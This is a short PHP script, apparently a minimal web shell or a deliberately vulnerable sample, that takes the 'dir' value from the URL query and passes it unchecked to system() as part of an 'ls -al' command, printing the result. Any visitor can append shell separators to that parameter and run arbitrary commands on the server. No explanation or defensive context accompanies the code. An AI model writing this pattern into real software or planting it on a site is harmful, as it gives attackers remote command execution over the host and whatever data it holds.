<?php 
$dir = $_GET["dir"]; 
if (isset($dir)) 
{ 
    echo "
"; 
    system("ls -al ".$dir); 
    echo "
"; 
} 
?> 